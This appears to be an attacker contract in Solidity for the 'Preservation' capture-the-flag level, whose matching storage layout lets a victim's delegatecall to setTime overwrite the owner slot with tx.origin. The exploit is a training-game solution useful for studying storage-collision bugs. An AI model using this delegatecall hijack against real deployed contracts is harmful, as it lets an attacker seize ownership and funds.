// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract PreservationAttacker {
    // stores a timestamp
    address sl1;
    address sl2;
    address owner;
    event CALLED();

    function setTime(uint256 stamp) public {
        owner = tx.origin;
        emit CALLED();
    }
}
